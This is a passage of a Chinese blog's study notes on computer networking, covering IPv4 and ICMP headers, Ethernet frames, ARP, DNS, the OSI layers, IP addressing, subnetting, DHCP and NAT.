<h2 id="IPv4协议头（20个字节：5段32位）"><a href="#IPv4协议头（20个字节：5段32位）" class="headerlink" title="IPv4协议头（20个字节：5段32位）"></a>IPv4协议头（20个字节：5段32位）</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655790934400.png"></p>
<ol>
<li><strong>版本</strong>：ip报文中，版本占了<strong>4位</strong>，用来表示该协议<strong>采用的是哪一个版本的ip</strong>，相同版本的ip才能进行通信。<em>一般此处的值为4，表示ipv4。</em></li>
<li><strong>头长度</strong>：该字段用<strong>四位</strong>表示，表示整个<strong>ip包头的长度</strong>，其中数的<strong>单位是4字节</strong>。即二进制数0000-1111（十进制数0-15），其中一个最小长度为0字节，最大长度为60字节。<em>一般来说此处的值为0101，表示头长度为20字节。</em></li>
<li><strong>Tos服务字段</strong>：该字段<strong>用8位表示</strong>。该字段<em>一般情况下不使用。</em></li>
<li><strong>总长度</strong>：该字段<strong>表示整个ip报文的长度</strong>，单位是<strong>1字节</strong>。能表示的最大字节为2^16-1&#x3D;65535字节。不过由于链路层的MTU限制。<em>超过1480字节后就会被分片（以太帧MTU为1500的情况下，除去20字节的包头）</em></li>
</ol>
<hr>
<ol start="5">
<li><strong>标识</strong>：<strong>2个字节16位</strong>，该字段是ip软件实现的时候自动产生的，该字段的目的不是为了接受方的按序接受而设置的，而是在ip分片以后，<strong>用来标识同一片分片</strong>的。方便ip分片的重组。</li>
<li><strong>标志</strong>：该字段是与ip分片有关的。其中<strong>有三位</strong>，但只有两位是有效的，分别为<strong>MF，DF，MF</strong>。MF标识后面是否还有分片，<strong>为1时，表示后面还有分片</strong>。DF标识是否能分片，<strong>为0表示可以分片</strong>。</li>
<li><strong>片偏移</strong>：该字段是与ip分片后，相应的ip片在总的ip片的位置。该字段的<strong>单位是8字节</strong>。比如，一个长度为4000字节的ip报文，到达路由器。这是超过了链路层的MTU，需要进行分片，4000字节中，20字节为包头，3980字节为数据，需要分成3个ip片（链路层MTU为1500），那么第一个分片的片偏移就是0，表示该分片在3980的第0位开始，第1479位结束。第二个ip片的片偏移为185（<strong>1480&#x2F;8</strong>），表示该分片开始的位置在原来ip的第1480位，结束在2959。第三片的片偏移为370（<strong>2960&#x2F;8</strong>），表示开始的时候是2960位，结束的时候在3979位。</li>
</ol>
<hr>
<ol start="8">
<li><strong>TTL</strong>：该片表示<strong>生存周期</strong>，该值<strong>占8位</strong>。ip分片每经过一个路由器该值减一，它的出现是<strong>为了防止路由环路</strong>，浪费带宽的问题。比如，该ip在R1路由器发送到R2路由器。R2路由器又发给R1路由器。防止这种循环。<em>window系统默认为128.</em></li>
<li><strong>协议</strong>：该值<strong>标识上层的协议</strong>。占8位。其中<em>1，标识ICMP、2标识IGMP、6标识TCP、17标识UDP、89标识OSPF。</em></li>
<li><strong>校验和</strong>：该值是对整个数据包的<strong>包头进行的校验</strong>。<strong>占16位</strong>。</li>
</ol>
<hr>
<ol start="11">
<li><strong>源地址和目的地址</strong>。标识发送ip片的源和目的ip，<strong>32位</strong></li>
<li>可选项，一般一些特殊的要求会加在这个部分。</li>
</ol>
<h2 id="扩展：ICMP协议分析"><a href="#扩展：ICMP协议分析" class="headerlink" title="扩展：ICMP协议分析"></a>扩展：ICMP协议分析</h2><h3 id="ICMP协议介绍"><a href="#ICMP协议介绍" class="headerlink" title="ICMP协议介绍"></a>ICMP协议介绍</h3><blockquote>
<p>网络本身是不可靠的，在网络传输过程中，可能会发生许多突发事件并导致数据传输失败。网络层的IP协议是一个<strong>无连接的协议</strong>，它不会处理网络层传输中的故障，而<strong>位于网络层的ICMP协议</strong>却恰好弥补了IP的缺限，它使用IP协议进行信息传递，向数据包中的源端节点提供发生在网络层的错误信息反馈。ICMP可以看作是IP协议的伴随协议。<strong>ICMP报文被封装在IP 数据报发送。</strong></p>
</blockquote>
<h3 id="ICMP报文格式"><a href="#ICMP报文格式" class="headerlink" title="ICMP报文格式"></a>ICMP报文格式</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655792282711.png"></p>
<ul>
<li><strong>类型</strong>：标识生成的错误报文，它是ICMP报文中的第一个字段；</li>
<li><strong>代码</strong>：进一步地限定生成ICMP报文。该字段用来查找产生错误的原因；</li>
<li>校验和：存储了ICMP所使用的校验和值。</li>
<li>未使用：保留字段，供将来使用，起值设为0</li>
<li>数据：包含了所有接受到的数据报的IP报头。还包含IP数据报中前8个字节的数据；</li>
</ul>
<p>其中类型和代码最重要，通过其可以看到返回信息：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655792417004.png"></p>
<p>最后来看一个<strong>实际的抓包</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655793887511.png"></p>
<hr>
<h1 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet II帧格式"></a>Ethernet II帧格式</h1><blockquote>
<p>以太网中大多数的数据帧使用的是 Ethernet II 格式,其具体如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655794049213.png"></p>
<p>Ethernet II 类型以太网帧的<strong>最小长度为 64 字节</strong>（6＋6＋2＋46＋4），<strong>最大长度为 1518 字节</strong>（6＋6＋2＋1500＋4）。其中：<br>（1）<strong>前 12 字节</strong>分别标识出发送数据帧的<strong>源节点 MAC 地</strong>址和接收数据帧的<strong>目标节点 MAC 地址</strong>；<br>（2）接下来的 <strong>2 个字节</strong>标识出以太网帧所携带的上层数据类型，如 16 进制数<strong>0x0800代表 IP 协议</strong>数据，<br>16 进制数<strong>0x86dd代表 IPv6 协议</strong>数据，16 进制数0x809B代表 AppleTalk 协议数据，16 进制数0x8138代表 Novell 类型协议数据等；<br>（3）在不定长的数据字段（Data）：其长度是 46 至 1500 字节；<br>（4）<strong>4 个字节</strong>的帧校验序列（Frame. Check Sequence，FCS），采用 32 位 CRC 循环冗余校验对从“目标 MAC 地址”字段到“数据”字段的数据进行校验。</p>
<p><strong>注：我们所获的MTU为1500字节，是不包含帧头和帧尾的，相当于1518-18.</strong></p>
<hr>
<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="协议介绍-1"><a href="#协议介绍-1" class="headerlink" title="协议介绍"></a>协议介绍</h2><blockquote>
<p><strong>地址解析的作用</strong>:协议地址和物理地址之间的转换，如IP地址和MAC地址之间的转换</p>
</blockquote>
<p>地址解析必须在某一物理网络中进行，一台主机在向<strong>同一物理网络</strong>上的另一台计算机发送数据时，应先做地址解析，然后按物理地址直接发送数据帧.</p>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655896491405.png"></p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>一个<strong>ARP请求消息</strong>是一个数据帧，其中包含发送站点的MAC地址和IP地址，以及目的站点的IP地址，并把此数据帧在本物理网络内广播<br>一个<strong>ARP应答消息</strong>是一个数据帧，其中包含应答站点的MAC地址和IP地址，以及原发送站点的IP地址，并把此数据帧发送给原发送站点 </p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655896560391.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655896604173.png"></p>
<h2 id="ARP高速缓存"><a href="#ARP高速缓存" class="headerlink" title="ARP高速缓存"></a>ARP高速缓存</h2><p>为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。<br>当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 </p>
<h1 id="DNS介绍"><a href="#DNS介绍" class="headerlink" title="DNS介绍"></a>DNS介绍</h1><h2 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h2><ol>
<li><p>域名：是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置，地理上的域名，指代有行政自主权的一个地方区域）。</p>
</li>
<li><p>DNS:映射域名与IP地址之间的对应关系 </p>
</li>
<li><p>域名服务器：提供域名解析</p>
</li>
</ol>
<h2 id="DNS工作流程"><a href="#DNS工作流程" class="headerlink" title="DNS工作流程"></a>DNS工作流程</h2><p>通过UDP包传输请求和应答，看一个例子：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655906094933.png"></p>
<p>（1）用户发起请求后，主机会先查询浏览器缓存和本机操作系统缓存；</p>
<p>（2）本机没有记录，主机向本地服务器发起查询；</p>
<p>（3）本地服务器没有记录，会向根服务发起请求；</p>
<p>（4）根据根服务器返回的结果，本地服务器向对应的顶级服务器发起请求；</p>
<p>（5）根据顶级服务器返回结果，本地服务器向权威服务器发起请求；</p>
<p>（6）本地服务器将解析记录告知主机，并保存在本地缓存，以供下次使用。</p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>初入计网</title>
    <url>/2022/09/09/%E8%AE%A1%E7%BD%91%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="计算机网络层次划分"><a href="#计算机网络层次划分" class="headerlink" title="计算机网络层次划分"></a>计算机网络层次划分</h1><h2 id="层次划分的巧妙之处"><a href="#层次划分的巧妙之处" class="headerlink" title="层次划分的巧妙之处"></a>层次划分的巧妙之处</h2><p>说到网络的层次划分，不得不说一句，在整个计算机的基本知识框架里，层次划分的思想体现在很多方面。比如前面看过的计算机的软件系统的结构，在硬件与应用程序之间也是采用中间层的方式进行划分，从最上方的应用程序等到最下方的硬件，层层递进，有着运行库，操作系统内核等多个中间层，不同层次之间有着不同的分工，而后通过各自的接口进行连接。最终实现应用程序对硬件的控制。</p>
<p>相应的，在计算机网络的知识框架里也有着类似的划分，我们将计算机网络体系结构的通信协议进行分层划分，形成一个简洁、易于理解的模型。</p>
<h2 id="层次划分的不同类别"><a href="#层次划分的不同类别" class="headerlink" title="层次划分的不同类别"></a>层次划分的不同类别</h2><p>常见的网络层次划分有TCP&#x2F;IP四层协议以及TCP&#x2F;IP五层协议和OSI七层模型。虽然有着不同的类别，但是在这三种划分的本质都是一样的，只是在划分的细致程度上有所不同。这三种模型的对应关系如下图：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629180.jpg" alt="对应关系"></p>
<h2 id="OSI层次划分的具体"><a href="#OSI层次划分的具体" class="headerlink" title="OSI层次划分的具体"></a>OSI层次划分的具体</h2><p><em>因为 不管是OSI七层模型还是TCP&#x2F;IP的四层、五层模型，每一层中都要自己的专属协议，完成自己相应的工作以及与上下层级之间进行沟通。由于OSI七层模型为网络的标准层次划分，所以我们以OSI七层模型为例从下向上进行一一介绍。</em></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629181.gif" alt="OSI层次划分"></p>
<h3 id="物理层（Physical-Layer）"><a href="#物理层（Physical-Layer）" class="headerlink" title="物理层（Physical Layer）"></a>物理层（Physical Layer）</h3><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，<strong>中继器</strong>（Repeater，也叫放大器）和<strong>集线器</strong>。</p>
<h3 id="数据链路层（Data-Link-Layer）"><a href="#数据链路层（Data-Link-Layer）" class="headerlink" title="数据链路层（Data Link Layer）"></a>数据链路层（Data Link Layer）</h3><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是<strong>将源自网络层来的数据可靠地传输到相邻节点的目标机网络层</strong>。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。<br>数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：<code>物理地址寻址、数据的成帧、流量控制、数据的检错、重发 </code>等。</p>
<blockquote>
<p>有关数据链路层的重要知识点：</p>
<blockquote>
<p>1&gt; 数据链路层为网络层提供可靠的数据传输；<br>2&gt; 基本数据单位为帧；<br>3&gt; 主要的协议：以太网协议；<br>4&gt; 两个重要设备名称：<strong>网桥和交换机</strong>。</p>
</blockquote>
</blockquote>
<h3 id="网络层（Network-Layer）"><a href="#网络层（Network-Layer）" class="headerlink" title="网络层（Network Layer）"></a>网络层（Network Layer）</h3><p>网络层的目的是<strong>实现两个端系统之间的数据透明传送</strong>，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，<code>那就是&quot;路径选择、路由及逻辑寻址&quot;。</code></p>
<p>网络层中涉及众多的协议，其中包括最重要的协议，也是TCP&#x2F;IP的核心协议——P协议 。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制 。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。具体的协议我们会在接下来的部分进行总结。</p>
<blockquote>
<p>有关网络层的重点为：</p>
<blockquote>
<p>1&gt; 网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；<br>2&gt; 基本数据单位为IP数据报；<br>3&gt; 包含的主要协议：<br>　IP协议（Internet Protocol，因特网互联协议）;<br>　ICMP协议（Internet Control Message Protocol，因特网控制报文协议）;<br>　ARP协议（Address Resolution Protocol，地址解析协议）;<br>　RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。<br>4&gt; 重要的设备：<strong>路由器。</strong></p>
</blockquote>
</blockquote>
<h3 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h3><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。 传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。 网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。 有关网络层的重点：</p>
<p>1&gt; 传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；<br>2&gt; 包含的主要协议：TCP协议（Transmission Control Protocol，传输控制协议）、UDP协议（User Datagram Protocol，用户数据报协议）；<br>3&gt; 重要设备：<strong>网关。</strong></p>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>为操作系统或网络应用程序提供访问网络服务的接口。</p>
<blockquote>
<p>会话层、表示层和应用层重点</p>
<blockquote>
<p>1&gt; 数据传输基本单位为报文；<br>2&gt; 包含的主要协议：FTP（文件传送协议）、Telnet（远程登录协议）、DNS（域名解析协议）、SMTP（邮件传送协议），POP3协议（邮局协议），HTTP协议（Hyper Text Transfer Protocol）。</p>
</blockquote>
</blockquote>
<blockquote>
<p>已经写完计算机体系结构的大体架构，下面我们来具体讲一下每一层的相关知识：</p>
</blockquote>
<h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><blockquote>
<p> 以下内容部分引用： 《图解网络》、菜鸟教程</p>
</blockquote>
<p>先放一张图：(内容较多，选取一部分进行讲解)</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629225.png" alt="ip全家桶"></p>
<h3 id="IP的作用"><a href="#IP的作用" class="headerlink" title="IP的作用"></a>IP的作用</h3><blockquote>
<p>IP 在 TCP&#x2F;IP 参考模型中处于第三层，也就是网络层。<br>网络层的主要作用是：实现主机与主机之间的通信，也叫点对点（end to end）通信</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629414.png" alt="ip的作用"></p>
<h3 id="IP与MAC的联系"><a href="#IP与MAC的联系" class="headerlink" title="IP与MAC的联系"></a>IP与MAC的联系</h3><blockquote>
<p>MAC 的作用则是实现「直连」的两个设备之间通信，而 IP 则负责在「没有直连」的两个网络之间进行通信传输。</p>
</blockquote>
<p><strong>引用一个例子：</strong><br>小黎要去一个很远的地方旅行，制定了一个行程表，其间需先后乘坐飞机、地铁、公交车才能抵达目的地，为此小林需要买飞机票，地铁票等。<br>飞机票和地铁票都是去往特定的地点的，每张票只能够在某一限定区间内移动，此处的「区间内」就如同通信网络中数据链路。<br>在区间内移动相当于数据链路层，充当区间内两个节点传输的功能，区间内的出发点好比源 MAC 地址，目标地点好比目的 MAC 地址。<br>整个旅游行程表就相当于网络层，充当远程定位的功能，行程的开始好比源 IP，行程的终点好比目的IP 地址。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629416.png" alt="配图"></p>
<p><code>正如上图所述，数据包在传输的过程中，源IP地址和目标IP地址在传输过程中是不会变化的，只有源 MAC 地址和目标 MAC 一直在变化。</code></p>
<h3 id="IP地址的基本知识"><a href="#IP地址的基本知识" class="headerlink" title="IP地址的基本知识"></a>IP地址的基本知识</h3><blockquote>
<p>在 TCP&#x2F;IP 网络通信时，为了保证能正常通信，每个设备都需要配置正确的 IP 地址，否则无法实现正常的通信。</p>
</blockquote>
<p>IP 地址（IPv4 地址）由 32 位正整数来表示，IP 地址在计算机是以二进制的方式处理的。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629419.png" alt="表示方法"></p>
<p><strong>IP地址的组成：</strong><br>一般我们把IP地址分为网络号和主机号。但是其实在网络号前面还有一个分类号，把IP地址分为ABC等类别。</p>
<blockquote>
<p>当主机号都为0时，此IP地址指定某个网络。<br>当主机号都为1时，此IP地址指定某个网络下的所有主机。</p>
<blockquote>
<p>通过主机号为1的IP地址用于广播，即在同一个链路中相互连接的主机之间发送数据包。</p>
</blockquote>
</blockquote>
<p><strong>无分类地址CIDR</strong></p>
<blockquote>
<p>由于IP的分类有许多缺点，所以后面提出来无分类地址，即CIDR.</p>
</blockquote>
<p>表示形式 <code>a.b.c.d/x</code> ，其中 <code>/x </code>表示前 x 位属于网络号， x 的范围是 0 ~ 32 ，这就使得 IP 地址更加具有灵活性。<br>比如<code> 10.100.122.2/24</code>，这种地址表示形式就是 CIDR，<code>/24 </code>表示前 24 位是网络号，剩余的 8 位是主机号。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629420.png" alt="一个例子"></p>
<p><strong>子网掩码</strong></p>
<blockquote>
<p>另一种划分网络号与主机号形式，那就是子网掩码，掩码的意思就是掩盖掉主机号，剩余的就是网络号。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629421.png" alt="直接看图"></p>
<p><code>前面很多划分IP地址的方法，但是你知道为什么要把IP地址划分为网络号和主机号吗？</code><br>因为两台计算机要通讯，首先要判断是否处于同一个广播域内，即网络地址是否相同。如果网络地址相同，表明接受方在本网络上，那么可以把数据包直接发送到目标主机。</p>
<p>路由器寻址工作中，也就是通过这样的方式来找到对应的网络号的，进而把数据包转发给对应的网络内。</p>
<p><strong>子网的划分</strong></p>
<blockquote>
<p>对于无须再划分成子网的IP地址来说，其子网掩码非常简单，即按照其定义即可写出：如某B类IP地址为 10.12.3.0，无须再分割子网，则该IP地址的子网掩码255.255.0.0。如果它是一个C类地址，则其子网掩码为 255.255.255.0。</p>
</blockquote>
<p>如果需要进行子网的划分，就要结合子网掩码与分类别IP地址。其实质就是通过按位与运算，把原IP地址的主机号的前几位归为一个子网的网络号，其余剩下的为子网的主机号。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629422.png" alt="子网划分"></p>
<p><strong>公有地址与私有地址</strong></p>
<blockquote>
<p>在 A、B、C 分类地址，实际上有分公有 IP 地址和私有 IP 地址。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629423.png" alt="地址的分类"></p>
<p>平时我们办公室、家里、学校用的 IP 地址，一般都是私有 IP 地址。因为这些地址允许组织内部的 IT人员自己管理、自己分配，而且可以重复。因此，你学校的某个私有 IP 地址和我学校的可以是一样的。<br>就像每个小区都有自己的楼编号和门牌号，你小区家可以叫 1 栋 101 号，我小区家也可以叫 1 栋101，没有任何问题。但一旦出了小区，就需要带上中山路 666 号（公网 IP 地址），是国家统一分配的，不能两个小区都叫中山路 666。<br>所以，公有 IP 地址是有个组织统一分配的，假设你要开一个博客网站，那么你就需要去申请购买一个公有 IP，这样全世界的人才能访问。并且公有 IP 地址基本上要在整个互联网范围内保持唯一。</p>
<p><strong>IP地址与路由控制</strong></p>
<blockquote>
<p>IP地址的网络地址这一部分是用于进行路由控制。<br>路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在主机和路由器上都会有各自的路由器控制表。</p>
</blockquote>
<p>在发送 IP 包时，首先要确定 IP 包首部中的目标地址，再从路由控制表中找到与该地址具有相同网络地址的记录，根据该记录将 IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录，就选择相同位数最多的网络地址，也就是最长匹配。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629424.png" alt="一个例子"></p>
<p>注:一个路由两个网卡，两张网卡的IP地址对应的网络号不同，所以就连接起了两个不同的网络。在数据包的ip地址匹配中，路由会先比对网络号，即路由表里的前号是否有对应的网络号。</p>
<p><strong>环回地址</strong></p>
<blockquote>
<p>环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。</p>
</blockquote>
<p>计算机使用一个特殊的 IP 地址 127.0.0.1 作为环回地址。与该地址具有相同意义的是一个叫做localhost 的主机名。使用这个 IP 或主机名时，数据包不会流向网络。(我们在使用hexo布置博客的时候，可以使用hexo s 命令先在本机部署查看)</p>
<h3 id="IP协议相关技术"><a href="#IP协议相关技术" class="headerlink" title="IP协议相关技术"></a>IP协议相关技术</h3><p><strong>DNS</strong></p>
<blockquote>
<p>我们在上网的时候，通常使用的方式是域名，而不是 IP 地址，因为域名方便人类记忆。<br>那么实现这一技术的就是 DNS 域名解析，DNS 可以将域名网址自动转换为具体的 IP 地址。</p>
</blockquote>
<p><strong>ARP</strong></p>
<blockquote>
<p>在传输一个 IP 数据报的时候，确定了源 IP 地址和目标 IP 地址后，就会通过主机「路由表」确定 IP 数据包下一跳。然而，网络层的下一层是数据链路层，所以我们还要知道「下一跳」的 MAC 地址。<br>由于主机的路由表中可以找到下一跳的 IP 地址，所以可以通过 ARP 协议，求得下一跳的 MAC 地址。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629425.png" alt="形象例子"></p>
<p><strong>RARP</strong></p>
<blockquote>
<p>ARP 协议是已知 IP 地址求 MAC 地址，那 RARP 协议正好相反，它是已知 MAC 地址求 IP 地址。例如将打印机服务器等小型嵌入式设备接入到网络时就经常会用得到。</p>
</blockquote>
<p><strong>DHCP</strong></p>
<blockquote>
<p>DHCP 在生活中我们是很常见的了，我们的电脑通常都是通过 DHCP 动态获取 IP 地址，大大省去了配<br>IP 信息繁琐的过程。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 客户端首先发起 DHCP 发现报文（DHCP DISCOVER） 的 IP 数据报，由于客户端没有 IP 地址，也不知道 DHCP 服务器的地址，所以使用的是 UDP 广播通信，其使用的广播目的地址是255.255.255.255（端口 67） 并且使用 0.0.0.0（端口 68） 作为源 IP 地址。DHCP 客户端将该IP 数据报传递给链路层，链路层然后将帧广播到所有的网络中设备。</span><br><span class="line">* DHCP 服务器收到 DHCP 发现报文时，用 DHCP 提供报文（DHCP OFFER） 向客户端做出响应。该报文仍然使用 IP 广播地址 255.255.255.255，该报文信息携带服务器提供可租约的 IP 地址、子网掩码、默认网关、DNS 服务器以及 IP 地址租用期。</span><br><span class="line">* 客户端收到一个或多个服务器的 DHCP 提供报文后，从中选择一个服务器，并向选中的服务器发送 DHCP 请求报文（DHCP REQUEST进行响应，回显配置的参数。</span><br><span class="line">* 最后，服务端用 DHCP ACK 报文对 DHCP 请求报文进行响应，应答所要求的参数。</span><br></pre></td></tr></table></figure>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629426.png" alt="exp"></p>
<p><strong>NAT</strong></p>
<blockquote>
<p>IPv4 的地址是非常紧缺的，在前面我们也提到可以通过无分类地址来减缓 IPv4 地址耗尽的速度，但是互联网的用户增速是非常惊人的，所以 IPv4 地址依然有被耗尽的危险。<br>于是，提出了一种网络地址转换 NAT 的方法，再次缓解了 IPv4 地址耗尽的问题。</p>
</blockquote>
<p>简单的来说 NAT 就是同个公司、家庭、教室内的主机对外部通信时，把私有 IP 地址转换成公有 IP 地址.</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629427.png" alt="转换过程"></p>
<hr>
<blockquote>
<p>ok ,ip的相关知识到此为止，这里知识简单介绍一下，以后会详细记录</p>
</blockquote>
<hr>
<h1 id="数据包的旅程"><a href="#数据包的旅程" class="headerlink" title="数据包的旅程~"></a>数据包的旅程~</h1><blockquote>
<p>当我们键入一个网址后，会获取到以网页显示，但是期间发生了什么呢?<br>下面我会结合《图解网络》与我自己的理解进行讲解。</p>
</blockquote>
<p>老样子，我们现放一个图，来大体了解一下这个过程吧。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629428.png"></p>
<p>下面具体分析：（会循序渐进，层层深入）</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="解析URL"><a href="#解析URL" class="headerlink" title="解析URL"></a>解析URL</h3><blockquote>
<p>当我们键入网址后，浏览器的第一步工作是解析URL(统一资源定位符)<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629429.png" alt="URL的组成"></p>
</blockquote>
<p>当没有路径名时，就代表访问根目录下事先设置的默认文件，也就是 <code>/index.html</code> 或者<code> /default.html</code>这些文件，这样就不会发生混乱了。</p>
<h3 id="生成HTTP请求信息"><a href="#生成HTTP请求信息" class="headerlink" title="生成HTTP请求信息"></a>生成HTTP请求信息</h3><blockquote>
<p>对 URL 进行解析之后，浏览器确定了 Web 服务器和文件名，接下来就是根据这些信息来生成 HTTP请求消息了</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629430.png" alt="http请求信息"></p>
<p><code>但是一个http请求信息在浩瀚的网络里，如何到达目的地？这个问题就在下面给出答案</code></p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><blockquote>
<p>通过浏览器解析 URL 并生成 HTTP 消息后，需要委托操作系统将消息发送给 Web 服务器。但在发送之前，还有一项工作需要完成，那就是查询服务器域名对应的 IP 地址，因为委托操作系统发送消息时，必须提供通信对象的 IP 地址</p>
</blockquote>
<p>这个过程通过DNS服务器进行完成，这里不再详细说~</p>
<h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><blockquote>
